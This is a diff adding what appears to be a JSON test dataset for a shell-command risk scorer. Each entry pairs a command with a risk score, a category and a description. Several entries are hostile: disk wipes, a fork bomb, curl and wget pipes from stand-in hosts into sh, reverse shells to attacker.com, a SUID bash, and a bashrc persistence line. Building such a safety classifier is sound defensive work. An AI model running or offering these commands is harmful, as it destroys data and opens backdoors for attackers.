@@ -1,0 +1,248 @@
+[
+  {
+    "command": "rm -rf /",
+    "expected_risk": 10.0,
+    "category": "filesystem_destruction",
+    "description": "Delete entire root filesystem"
+  },
+  {
+    "command": "rm -rf /*",
+    "expected_risk": 10.0,
+    "category": "filesystem_destruction",
+    "description": "Delete all root directories"
+  },
+  {
+    "command": "dd if=/dev/zero of=/dev/sda",
+    "expected_risk": 10.0,
+    "category": "disk_wipe",
+    "description": "Overwrite primary disk with zeros"
+  },
+  {
+    "command": "dd if=/dev/urandom of=/dev/sda bs=1M",
+    "expected_risk": 10.0,
+    "category": "disk_wipe",
+    "description": "Overwrite disk with random data"
+  },
+  {
+    "command": "mkfs.ext4 /dev/sda1",
+    "expected_risk": 9.5,
+    "category": "disk_format",
+    "description": "Format disk partition (data loss)"
+  },
+  {
+    "command": ":(){ :|:& };:",
+    "expected_risk": 10.0,
+    "category": "fork_bomb",
+    "description": "Fork bomb (resource exhaustion)"
+  },
+  {
+    "command": "sudo chmod 777 -R /etc",
+    "expected_risk": 9.0,
+    "category": "insecure_permissions",
+    "description": "Make system config world-writable"
+  },
+  {
+    "command": "sudo chmod 777 -R /",
+    "expected_risk": 10.0,
+    "category": "insecure_permissions",
+    "description": "Make entire filesystem world-writable"
+  },
+  {
+    "command": "sudo rm -rf /usr",
+    "expected_risk": 9.5,
+    "category": "system_destruction",
+    "description": "Delete system binaries directory"
+  },
+  {
+    "command": "sudo rm -rf /bin",
+    "expected_risk": 9.5,
+    "category": "system_destruction",
+    "description": "Delete essential binaries"
+  },
+  {
+    "command": "sudo rm -rf /etc",
+    "expected_risk": 9.5,
+    "category": "system_destruction",
+    "description": "Delete system configuration"
+  },
+  {
+    "command": "find / -name '*.log' -delete",
+    "expected_risk": 6.0,
+    "category": "data_deletion",
+    "description": "Delete all log files system-wide"
+  },
+  {
+    "command": "find /home -name '*' -delete",
+    "expected_risk": 8.0,
+    "category": "data_deletion",
+    "description": "Delete all files in home directories"
+  },
+  {
+    "command": "rm -rf ~/*",
+    "expected_risk": 7.0,
+    "category": "data_deletion",
+    "description": "Delete all user files"
+  },
+  {
+    "command": "shred -vfz /dev/sda",
+    "expected_risk": 10.0,
+    "category": "disk_wipe",
+    "description": "Securely wipe disk (irreversible)"
+  },
+  {
+    "command": "sudo iptables -F && sudo iptables -X",
+    "expected_risk": 6.5,
+    "category": "network_security",
+    "description": "Flush all firewall rules"
+  },
+  {
+    "command": "sudo systemctl stop firewalld",
+    "expected_risk": 5.0,
+    "category": "network_security",
+    "description": "Disable firewall"
+  },
+  {
+    "command": "curl http://malicious.com/script.sh | sudo bash",
+    "expected_risk": 9.0,
+    "category": "remote_execution",
+    "description": "Execute remote script with root privileges"
+  },
+  {
+    "command": "wget -O - http://evil.com/payload | sh",
+    "expected_risk": 8.5,
+    "category": "remote_execution",
+    "description": "Download and execute remote script"
+  },
+  {
+    "command": "echo 1 > /proc/sys/kernel/sysrq",
+    "expected_risk": 6.0,
+    "category": "kernel_modification",
+    "description": "Enable SysRq kernel commands"
+  },
+  {
+    "command": "ls -la",
+    "expected_risk": 0.0,
+    "category": "safe",
+    "description": "List directory contents (safe)"
+  },
+  {
+    "command": "cat /etc/passwd",
+    "expected_risk": 1.0,
+    "category": "safe",
+    "description": "Read system file (read-only, safe)"
+  },
+  {
+    "command": "grep -r 'pattern' .",
+    "expected_risk": 0.0,
+    "category": "safe",
+    "description": "Search for pattern (safe)"
+  },
+  {
+    "command": "find . -name '*.log'",
+    "expected_risk": 0.0,
+    "category": "safe",
+    "description": "Find log files (safe, no deletion)"
+  },
+  {
+    "command": "git status",
+    "expected_risk": 0.0,
+    "category": "safe",
+    "description": "Check git status (safe)"
+  },
+  {
+    "command": "docker ps -a",
+    "expected_risk": 0.0,
+    "category": "safe",
+    "description": "List Docker containers (safe)"
+  },
+  {
+    "command": "npm install",
+    "expected_risk": 2.0,
+    "category": "moderate",
+    "description": "Install packages (could download malicious code)"
+  },
+  {
+    "command": "pip install package",
+    "expected_risk": 2.0,
+    "category": "moderate",
+    "description": "Install Python package (supply chain risk)"
+  },
+  {
+    "command": "cargo build --release",
+    "expected_risk": 0.5,
+    "category": "safe",
+    "description": "Build Rust project (safe)"
+  },
+  {
+    "command": "sudo apt-get update",
+    "expected_risk": 1.0,
+    "category": "moderate",
+    "description": "Update package lists (needs sudo but safe)"
+  },
+  {
+    "command": "rm /tmp/test.txt",
+    "expected_risk": 1.5,
+    "category": "safe",
+    "description": "Delete single temp file (low risk)"
+  },
+  {
+    "command": "rm -rf /tmp/project",
+    "expected_risk": 4.0,
+    "category": "moderate",
+    "description": "Recursively delete temp directory"
+  },
+  {
+    "command": "sudo reboot",
+    "expected_risk": 3.0,
+    "category": "moderate",
+    "description": "Reboot system (disruptive but reversible)"
+  },
+  {
+    "command": "sudo shutdown -h now",
+    "expected_risk": 3.0,
+    "category": "moderate",
+    "description": "Shutdown system immediately"
+  },
+  {
+    "command": "kill -9 1234",
+    "expected_risk": 2.0,
+    "category": "moderate",
+    "description": "Force kill process (moderate risk)"
+  },
+  {
+    "command": "sudo kill -9 1",
+    "expected_risk": 8.0,
+    "category": "system_destruction",
+    "description": "Kill init process (system crash)"
+  },
+  {
+    "command": "nc -lvp 4444 -e /bin/bash",
+    "expected_risk": 8.5,
+    "category": "backdoor",
+    "description": "Create reverse shell backdoor"
+  },
+  {
+    "command": "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+    "expected_risk": 9.0,
+    "category": "backdoor",
+    "description": "Reverse shell to remote attacker"
+  },
+  {
+    "command": "chmod u+s /bin/bash",
+    "expected_risk": 8.0,
+    "category": "privilege_escalation",
+    "description": "Set SUID bit on bash (privilege escalation)"
+  },
+  {
+    "command": "sudo su -",
+    "expected_risk": 4.0,
+    "category": "moderate",
+    "description": "Switch to root user (privileged but intentional)"
+  },
+  {
+    "command": "echo 'malicious' >> ~/.bashrc",
+    "expected_risk": 5.0,
+    "category": "persistence",
+    "description": "Modify shell startup file (persistence mechanism)"
+  }
+]
